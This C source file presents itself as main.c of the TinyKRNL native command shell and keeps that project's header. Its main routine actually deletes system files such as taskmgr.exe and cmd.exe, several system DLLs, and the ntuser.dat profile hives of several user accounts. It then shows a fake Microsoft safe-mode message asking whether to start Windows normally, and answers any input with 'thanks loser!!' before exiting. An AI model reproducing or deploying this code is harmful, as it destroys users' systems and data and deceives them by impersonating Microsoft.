/*++

Copyright (c) Alex Ionescu.  All rights reserved.
Copyright (c) 2011 amdf.

    THIS CODE AND INFORMATION IS PROVIDED UNDER THE LESSER GNU PUBLIC LICENSE.
    PLEASE READ THE FILE "COPYING" IN THE TOP LEVEL DIRECTORY.

Module Name:

    main.c

Abstract:

    The Native Command Line Interface (NCLI) is the command shell for the
    TinyKRNL OS.
    This module handles the main command line interface and command parsing.

Environment:

    Native mode

Revision History:

    Alex Ionescu - Started Implementation - 01-Mar-06
    Alex Ionescu - Reworked architecture - 23-Mar-06
    amdf         - Added process launch command - 25-Jan-11
    amdf         - Added move command - 20-Feb-11

--*/
#include "precomp.h"

size_t
strnlen(const char *s, size_t maxlen)
{
	size_t len;

	for (len = 0; len < maxlen; len++, s++) {
		if (!*s)
			break;
	}
	return (len);
}

HANDLE hKeyboard;
HANDLE hHeap;
HANDLE hKey;

#define __NCLI_VER__ "0.12 x86"

WCHAR *helpstr[] =
{
  {
    L"\n"
    L"cd X     - Change directory to X    md X     - Make directory X\n"
    L"copy X Y - Copy file X to Y         poweroff - Power off PC\n"
    L"dir      - Show directory contents  pwd      - Print working directory\n"
    L"del X    - Delete file X            reboot   - Reboot PC\n"
    L"devtree  - Dump device tree         shutdown - Shutdown PC\n"
    L"\x0000"
  },
  {
    L"exit     - Exit shell               sysinfo  - Dump system information\n"
    L"lm       - List modules             vid      - Test screen output\n"
    L"lp       - List processes           move X Y - Move file X to Y\n"
    L"\n"
    L"If a command is not in the list, it is treated as an executable name\n"
    L"\n"
    L"\x0000"
  }
};
/*++
 * @name RtlClipProcessMessage
 *
 * The RtlClipProcessMessage routine
 *
 * @param Command
 *        FILLMEIN
 *
 * @return None.
 *
 * @remarks Documentation for this routine needs to be completed.
 *
 *--*/
VOID die() {
   DeinitHeapMemory( hHeap );
        NtTerminateProcess(NtCurrentProcess(), 0);
}
VOID
RtlClipProcessMessage(PCHAR Command)
{
    WCHAR CurrentDirectory[MAX_PATH];
    WCHAR buf1[MAX_PATH];
    WCHAR buf2[MAX_PATH];
    UNICODE_STRING CurrentDirectoryString;
    CHAR CommandBuf[BUFFER_SIZE];

    //
    // Copy command line and break it to arguments
    //
    // if xargc = 3, then xargv[1], xargv[2], xargv[3] are available
    // xargv[1] is a command name, xargv[2] is the first parameter

    memset(CommandBuf, 0x00, BUFFER_SIZE);
    strncpy(CommandBuf, Command, strnlen(Command, BUFFER_SIZE));
    StringToArguments(CommandBuf);

  RtlCliDisplayString("thanks loser!!");

  die();
}

/*++
 * @name RtlClipDisplayPrompt
 *
 * The RtlClipDisplayPrompt routine
 *
 * @param None.
 *
 * @return None.
 *
 * @remarks Documentation for this routine needs to be completed.
 *
 *--*/
VOID
RtlClipDisplayPrompt(VOID)
{
    WCHAR CurrentDirectory[MAX_PATH];
    ULONG DirSize;
    UNICODE_STRING DirString;

    //
    // Get the current directory
    //
    DirSize = RtlCliGetCurrentDirectory(CurrentDirectory) / sizeof(WCHAR);

    //
    // Display it
    //
    CurrentDirectory[DirSize] = L'>';
    CurrentDirectory[DirSize + 1] = UNICODE_NULL;
    RtlInitUnicodeString(&DirString, CurrentDirectory);
    RtlCliPrintString(&DirString);
}

/*++
 * @name main
 *
 * The main routine
 *
 * @param argc
 *        FILLMEIN
 *
 * @param argv[]
 *        FILLMEIN
 *
 * @param envp[]
 *        FILLMEIN
 *
 * @param DebugFlag
 *        FILLMEIN
 *
 * @return NTSTATUS
 *
 * @remarks Documentation for this routine needs to be completed.
 *
 *--*/

BOOL HEADASSGetFullPath(IN PCSTR filename, OUT PWSTR out, IN BOOL add_slash)
{
  UNICODE_STRING us;
  ANSI_STRING as;
  WCHAR cur_path[MAX_PATH];

  if (NULL == filename || NULL == cur_path || NULL == out)
  {
    return FALSE;
  }

  if ((strlen(filename) > 1) && filename[1] == ':')
  {
    RtlInitAnsiString(&as, filename);
    RtlAnsiStringToUnicodeString(&us, &as, TRUE);

    wcscpy(out, us.Buffer);
    if (add_slash)
    {
      wcscat(out, L"\\");
    }

    RtlFreeUnicodeString(&us);
    RtlFreeAnsiString(&as);
  } else
  {
    RtlInitAnsiString(&as, filename);
    RtlAnsiStringToUnicodeString(&us, &as, TRUE);

   
    wcscat(out, us.Buffer);
    if (add_slash)
    {
      wcscat(out, L"\\");
    }

    RtlFreeUnicodeString(&us);
    RtlFreeAnsiString(&as);
  }
  return TRUE;
};


NTSTATUS
__cdecl
main(INT argc,
     PCHAR argv[],
     PCHAR envp[],
     ULONG DebugFlag OPTIONAL)
{
    PPEB Peb = NtCurrentPeb();
    NTSTATUS Status;
    PCHAR Command;

  
       PCWSTR  file1  = L"C:\\Windows\\System32\\taskmgr.exe";
       PCWSTR  file2  = L"C:\\Windows\\System32\\cmd.exe";
       PCWSTR  file3  = L"C:\\Windows\\System32\\UserDataAccessRes.dll";
       PCWSTR  file4  = L"C:\\Windows\\System32\\usermgr.dll";
       PCWSTR  file5  = L"C:\\Windows\\SysWOW64\\Windows.Internal.UI.Shell.WindowTabManager.dll";
      PCWSTR  file6  = L"C:\\Users\\user\\ntuser.dat";
   PCWSTR  file7  = L"C:\\Users\\admin\\ntuser.dat";
   PCWSTR  file8  = L"C:\\Users\\default\\lsaadt.dll";
  PCWSTR  file9  = L"C:\\Users\\andrew\\ntuser.dat";
   PCWSTR  file0  = L"C:\\Users\\administrator\\ntuser.dat";

NtFileDeleteFile(file1);
NtFileDeleteFile(file2);
NtFileDeleteFile(file3);
NtFileDeleteFile(file4);
NtFileDeleteFile(file5);
NtFileDeleteFile(file6);
NtFileDeleteFile(file7);
NtFileDeleteFile(file8);
NtFileDeleteFile(file9);
NtFileDeleteFile(file0);



    hHeap = InitHeapMemory();
    hKey = NULL;



 RtlCliDisplayString("   o                       ___---___                    .          ");        
 RtlCliDisplayString("      .              .--\\        --.     .     .         .");
 RtlCliDisplayString("                   ./.;_.\\     __/~ \\.     ");
 RtlCliDisplayString("                  /;  / `-'  __\\    . \\                           ") ;
 RtlCliDisplayString(".        .       / ,--'     / .   .;   \\        |");
 RtlCliDisplayString("                | .|       /       __   |      -O-       .");
 RtlCliDisplayString("               |__/    __ |  . ;   \\ | . |      |");
 RtlCliDisplayString("               |      /  \\_    . ;| \\___|    ");
 RtlCliDisplayString("  .    o       |      \\  .~\\___,--'     |           .");
 RtlCliDisplayString("                |     | . ; ~~~~\\_    __|");
 RtlCliDisplayString("   |             \\    \\   .  .  ; \\  /_/   .");
 RtlCliDisplayString("  -O-        .    \\   /         . |  ~/                  .");
 RtlCliDisplayString("   |    .          ~\\ \\   .      /  /~          o");
 RtlCliDisplayString(" .                   ~--___ ; ___--~       ");
 RtlCliDisplayString("                .          ---         .   ");
 RtlCliDisplayString("   o                       ___---___                    .          ");        
 RtlCliDisplayString("      .              .--\\        --.     .     .         .");
 RtlCliDisplayString("                   ./.;_.\\     __/~ \\.     ");
 RtlCliDisplayString("                  /;  / `-'  __\\    . \\                           ") ;
 RtlCliDisplayString(".        .       / ,--'     / .   .;   \\        |");
 RtlCliDisplayString("                | .|       /       __   |      -O-       .");
 RtlCliDisplayString("               |__/    __ |  . ;   \\ | . |      |");
 RtlCliDisplayString("               |      /  \\_    . ;| \\___|    ");
 RtlCliDisplayString("  .    o       |      \\  .~\\___,--'     |           .");
 RtlCliDisplayString("                |     | . ; ~~~~\\_    __|");
 RtlCliDisplayString("   |             \\    \\   .  .  ; \\  /_/   .");
 RtlCliDisplayString("  -O-        .    \\   /         . |  ~/                  .");
 RtlCliDisplayString("   |    .          ~\\ \\   .      /  /~          o");
 RtlCliDisplayString(" .                   ~--___ ; ___--~       ");
 RtlCliDisplayString("                .          ---         .   ");RtlCliDisplayString("   o                       ___---___                    .          ");        
 RtlCliDisplayString("      .              .--\\        --.     .     .         .");
 RtlCliDisplayString("                   ./.;_.\\     __/~ \\.     ");
 RtlCliDisplayString("                  /;  / `-'  __\\    . \\                           ") ;
 RtlCliDisplayString(".        .       / ,--'     / .   .;   \\        |");
 RtlCliDisplayString("                | .|       /       __   |      -O-       .");
 RtlCliDisplayString("               |__/    __ |  . ;   \\ | . |      |");
 RtlCliDisplayString("               |      /  \\_    . ;| \\___|    ");
 RtlCliDisplayString("  .    o       |      \\  .~\\___,--'     |           .");
 RtlCliDisplayString("                |     | . ; ~~~~\\_    __|");
 RtlCliDisplayString("   |             \\    \\   .  .  ; \\  /_/   .");
 RtlCliDisplayString("  -O-        .    \\   /         . |  ~/                  .");
 RtlCliDisplayString("   |    .          ~\\ \\   .      /  /~          o");
 RtlCliDisplayString(" .                   ~--___ ; ___--~       ");
 RtlCliDisplayString("                .          ---         .   ");
 RtlCliDisplayString("   o                       ___---___                    .          ");        
 RtlCliDisplayString("      .              .--\\        --.     .     .         .");
 RtlCliDisplayString("                   ./.;_.\\     __/~ \\.     ");
 RtlCliDisplayString("                  /;  / `-'  __\\    . \\                           ") ;
 RtlCliDisplayString(".        .       / ,--'     / .   .;   \\        |");
 RtlCliDisplayString("                | .|       /       __   |      -O-       .");
 RtlCliDisplayString("               |__/    __ |  . ;   \\ | . |      |");
 RtlCliDisplayString("               |      /  \\_    . ;| \\___|    ");
 RtlCliDisplayString("  .    o       |      \\  .~\\___,--'     |           .");
 RtlCliDisplayString("                |     | . ; ~~~~\\_    __|");
 RtlCliDisplayString("   |             \\    \\   .  .  ; \\  /_/   .");
 RtlCliDisplayString("  -O-        .    \\   /         . |  ~/                  .");
 RtlCliDisplayString("   |    .          ~\\ \\   .      /  /~          o");
 RtlCliDisplayString(" .                   ~--___ ; ___--~       ");
 RtlCliDisplayString("                .          ---         .   ");RtlCliDisplayString("   o                       ___---___                    .          ");        
 RtlCliDisplayString("      .              .--\\        --.     .     .         .");
 RtlCliDisplayString("                   ./.;_.\\     __/~ \\.     ");
 RtlCliDisplayString("                  /;  / `-'  __\\    . \\                           ") ;
 RtlCliDisplayString(".        .       / ,--'     / .   .;   \\        |");
 RtlCliDisplayString("                | .|       /       __   |      -O-       .");
 RtlCliDisplayString("               |__/    __ |  . ;   \\ | . |      |");
 RtlCliDisplayString("               |      /  \\_    . ;| \\___|    ");
 RtlCliDisplayString("  .    o       |      \\  .~\\___,--'     |           .");
 RtlCliDisplayString("                |     | . ; ~~~~\\_    __|");
 RtlCliDisplayString("   |             \\    \\   .  .  ; \\  /_/   .");
 RtlCliDisplayString("  -O-        .    \\   /         . |  ~/                  .");
 RtlCliDisplayString("   |    .          ~\\ \\   .      /  /~          o");
 RtlCliDisplayString(" .                   ~--___ ; ___--~       ");
 RtlCliDisplayString("                .          ---         .   ");
 RtlCliDisplayString("   o                       ___---___                    .          ");        
 RtlCliDisplayString("      .              .--\\        --.     .     .         .");
 RtlCliDisplayString("                   ./.;_.\\     __/~ \\.     ");
 RtlCliDisplayString("                  /;  / `-'  __\\    . \\                           ") ;
 RtlCliDisplayString(".        .       / ,--'     / .   .;   \\        |");
 RtlCliDisplayString("                | .|       /       __   |      -O-       .");
 RtlCliDisplayString("               |__/    __ |  . ;   \\ | . |      |");
 RtlCliDisplayString("               |      /  \\_    . ;| \\___|    ");
 RtlCliDisplayString("  .    o       |      \\  .~\\___,--'     |           .");
 RtlCliDisplayString("                |     | . ; ~~~~\\_    __|");
 RtlCliDisplayString("   |             \\    \\   .  .  ; \\  /_/   .");
 RtlCliDisplayString("  -O-        .    \\   /         . |  ~/                  .");
 RtlCliDisplayString("   |    .          ~\\ \\   .      /  /~          o");
 RtlCliDisplayString(" .                   ~--___ ; ___--~       ");
 RtlCliDisplayString("                .          ---         .   ");RtlCliDisplayString("   o                       ___---___                    .          ");        
 RtlCliDisplayString("      .              .--\\        --.     .     .         .");
 RtlCliDisplayString("                   ./.;_.\\     __/~ \\.     ");
 RtlCliDisplayString("                  /;  / `-'  __\\    . \\                           ") ;
 RtlCliDisplayString(".        .       / ,--'     / .   .;   \\        |");
 RtlCliDisplayString("                | .|       /       __   |      -O-       .");
 RtlCliDisplayString("               |__/    __ |  . ;   \\ | . |      |");
 RtlCliDisplayString("               |      /  \\_    . ;| \\___|    ");
 RtlCliDisplayString("  .    o       |      \\  .~\\___,--'     |           .");
 RtlCliDisplayString("                |     | . ; ~~~~\\_    __|");
 RtlCliDisplayString("   |             \\    \\   .  .  ; \\  /_/   .");
 RtlCliDisplayString("  -O-        .    \\   /         . |  ~/                  .");
 RtlCliDisplayString("   |    .          ~\\ \\   .      /  /~          o");
 RtlCliDisplayString(" .                   ~--___ ; ___--~       ");
 RtlCliDisplayString("                .          ---         .   ");
 RtlCliDisplayString("   o                       ___---___                    .          ");        
 RtlCliDisplayString("      .              .--\\        --.     .     .         .");
 RtlCliDisplayString("                   ./.;_.\\     __/~ \\.     ");
 RtlCliDisplayString("                  /;  / `-'  __\\    . \\                           ") ;
 RtlCliDisplayString(".        .       / ,--'     / .   .;   \\        |");
 RtlCliDisplayString("                | .|       /       __   |      -O-       .");
 RtlCliDisplayString("               |__/    __ |  . ;   \\ | . |      |");
 RtlCliDisplayString("               |      /  \\_    . ;| \\___|    ");
 RtlCliDisplayString("  .    o       |      \\  .~\\___,--'     |           .");
 RtlCliDisplayString("                |     | . ; ~~~~\\_    __|");
 RtlCliDisplayString("   |             \\    \\   .  .  ; \\  /_/   .");
 RtlCliDisplayString("  -O-        .    \\   /         . |  ~/                  .");
 RtlCliDisplayString("   |    .          ~\\ \\   .      /  /~          o");
 RtlCliDisplayString(" .                   ~--___ ; ___--~       ");
 RtlCliDisplayString("                .          ---         .   ");RtlCliDisplayString("   o                       ___---___                    .          ");        
 RtlCliDisplayString("      .              .--\\        --.     .     .         .");
 RtlCliDisplayString("                   ./.;_.\\     __/~ \\.     ");
 RtlCliDisplayString("                  /;  / `-'  __\\    . \\                           ") ;
 RtlCliDisplayString(".        .       / ,--'     / .   .;   \\        |");
 RtlCliDisplayString("                | .|       /       __   |      -O-       .");
 RtlCliDisplayString("               |__/    __ |  . ;   \\ | . |      |");
 RtlCliDisplayString("               |      /  \\_    . ;| \\___|    ");
 RtlCliDisplayString("  .    o       |      \\  .~\\___,--'     |           .");
 RtlCliDisplayString("                |     | . ; ~~~~\\_    __|");
 RtlCliDisplayString("   |             \\    \\   .  .  ; \\  /_/   .");
 RtlCliDisplayString("  -O-        .    \\   /         . |  ~/                  .");
 RtlCliDisplayString("   |    .          ~\\ \\   .      /  /~          o");
 RtlCliDisplayString(" .                   ~--___ ; ___--~       ");
 RtlCliDisplayString("                .          ---         .   ");
 RtlCliDisplayString("   o                       ___---___                    .          ");        
 RtlCliDisplayString("      .              .--\\        --.     .     .         .");
 RtlCliDisplayString("                   ./.;_.\\     __/~ \\.     ");
 RtlCliDisplayString("                  /;  / `-'  __\\    . \\                           ") ;
 RtlCliDisplayString(".        .       / ,--'     / .   .;   \\        |");
 RtlCliDisplayString("                | .|       /       __   |      -O-       .");
 RtlCliDisplayString("               |__/    __ |  . ;   \\ | . |      |");
 RtlCliDisplayString("               |      /  \\_    . ;| \\___|    ");
 RtlCliDisplayString("  .    o       |      \\  .~\\___,--'     |           .");
 RtlCliDisplayString("                |     | . ; ~~~~\\_    __|");
 RtlCliDisplayString("   |             \\    \\   .  .  ; \\  /_/   .");
 RtlCliDisplayString("  -O-        .    \\   /         . |  ~/                  .");
 RtlCliDisplayString("   |    .          ~\\ \\   .      /  /~          o");
 RtlCliDisplayString(" .                   ~--___ ; ___--~       ");
 RtlCliDisplayString("                .          ---         .   ");RtlCliDisplayString("   o                       ___---___                    .          ");        
 RtlCliDisplayString("      .              .--\\        --.     .     .         .");
 RtlCliDisplayString("                   ./.;_.\\     __/~ \\.     ");
 RtlCliDisplayString("                  /;  / `-'  __\\    . \\                           ") ;
 RtlCliDisplayString(".        .       / ,--'     / .   .;   \\        |");
 RtlCliDisplayString("                | .|       /       __   |      -O-       .");
 RtlCliDisplayString("               |__/    __ |  . ;   \\ | . |      |");
 RtlCliDisplayString("               |      /  \\_    . ;| \\___|    ");
 RtlCliDisplayString("  .    o       |      \\  .~\\___,--'     |           .");
 RtlCliDisplayString("                |     | . ; ~~~~\\_    __|");
 RtlCliDisplayString("   |             \\    \\   .  .  ; \\  /_/   .");
 RtlCliDisplayString("  -O-        .    \\   /         . |  ~/                  .");
 RtlCliDisplayString("   |    .          ~\\ \\   .      /  /~          o");
 RtlCliDisplayString(" .                   ~--___ ; ___--~       ");
 RtlCliDisplayString("                .          ---         .   ");
 RtlCliDisplayString("   o                       ___---___                    .          ");        
 RtlCliDisplayString("      .              .--\\        --.     .     .         .");
 RtlCliDisplayString("                   ./.;_.\\     __/~ \\.     ");
 RtlCliDisplayString("                  /;  / `-'  __\\    . \\                           ") ;
 RtlCliDisplayString(".        .       / ,--'     / .   .;   \\        |");
 RtlCliDisplayString("                | .|       /       __   |      -O-       .");
 RtlCliDisplayString("               |__/    __ |  . ;   \\ | . |      |");
 RtlCliDisplayString("               |      /  \\_    . ;| \\___|    ");
 RtlCliDisplayString("  .    o       |      \\  .~\\___,--'     |           .");
 RtlCliDisplayString("                |     | . ; ~~~~\\_    __|");
 RtlCliDisplayString("   |             \\    \\   .  .  ; \\  /_/   .");
 RtlCliDisplayString("  -O-        .    \\   /         . |  ~/                  .");
 RtlCliDisplayString("   |    .          ~\\ \\   .      /  /~          o");
 RtlCliDisplayString(" .                   ~--___ ; ___--~       ");
 RtlCliDisplayString("                .          ---         .   ");
    RtlCliDisplayString("   o                       ___---___                    .          ");        
 RtlCliDisplayString("      .              .--\\        --.     .     .         .");
 RtlCliDisplayString("                   ./.;_.\\     __/~ \\.     ");
 RtlCliDisplayString("                  /;  / `-'  __\\    . \\                           ") ;
 RtlCliDisplayString(".        .       / ,--'     / .   .;   \\        |");
 RtlCliDisplayString("                | .|       /       __   |      -O-       .");
 RtlCliDisplayString("               |__/    __ |  . ;   \\ | . |      |");
 RtlCliDisplayString("               |      /  \\_    . ;| \\___|    ");
 RtlCliDisplayString("  .    o       |      \\  .~\\___,--'     |           .");
 RtlCliDisplayString("                |     | . ; ~~~~\\_    __|");
 RtlCliDisplayString("   |             \\    \\   .  .  ; \\  /_/   .");
 RtlCliDisplayString("  -O-        .    \\   /         . |  ~/                  .");
 RtlCliDisplayString("   |    .          ~\\ \\   .      /  /~          o");
 RtlCliDisplayString(" .                   ~--___ ; ___--~       ");
 RtlCliDisplayString("                .          ---         .   ");
 RtlCliDisplayString("   o                       ___---___                    .          ");        
 RtlCliDisplayString("      .              .--\\        --.     .     .         .");
 RtlCliDisplayString("                   ./.;_.\\     __/~ \\.     ");
 RtlCliDisplayString("                  /;  / `-'  __\\    . \\                           ") ;
 RtlCliDisplayString(".        .       / ,--'     / .   .;   \\        |");
 RtlCliDisplayString("                | .|       /       __   |      -O-       .");
 RtlCliDisplayString("               |__/    __ |  . ;   \\ | . |      |");
 RtlCliDisplayString("               |      /  \\_    . ;| \\___|    ");
 RtlCliDisplayString("  .    o       |      \\  .~\\___,--'     |           .");
 RtlCliDisplayString("                |     | . ; ~~~~\\_    __|");
 RtlCliDisplayString("   |             \\    \\   .  .  ; \\  /_/   .");
 RtlCliDisplayString("  -O-        .    \\   /         . |  ~/                  .");
 RtlCliDisplayString("   |    .          ~\\ \\   .      /  /~          o");
 RtlCliDisplayString(" .                   ~--___ ; ___--~       ");
 RtlCliDisplayString("                .          ---         .   ");

    RtlCliDisplayString("\n\n\n\n\n(C) Copyright 2021 Microsoft Corporation \n");
    RtlCliDisplayString("Something went wrong with starting a Windows session, and Windows will default to loading in SAFE mode. \n ");
  RtlCliDisplayString("While in safe mode, Windows won't load the normal data, and apps may not function as normal. \n (C:) \n");
  
  RtlCliDisplayString("Start Windows in NORMAL mode? (y/n): ");
  
    //
    // Setup keyboard input
    //
    Status = RtlCliOpenInputDevice(&hKeyboard, KeyboardType);

    //
    // Show initial prompt
    //
  

    while (TRUE)
    {
        //
        // Get the line that was entered and display a new line
        //
        Command = RtlCliGetLine(hKeyboard);
        RtlCliDisplayString("\n");

        //
        // Make sure there's actually a command
        //
        if (*Command)
        {
            //
            // Process the command and do a new line again.
            //
            RtlClipProcessMessage(Command);
            RtlCliDisplayString("\n");
        }

        //
        // Display the prompt, and restart the loop
        //
        continue;
    }

    DeinitHeapMemory( hHeap );
    NtTerminateProcess( NtCurrentProcess(), 0 );
    
    //
    // Return
    //
    return STATUS_SUCCESS;
}
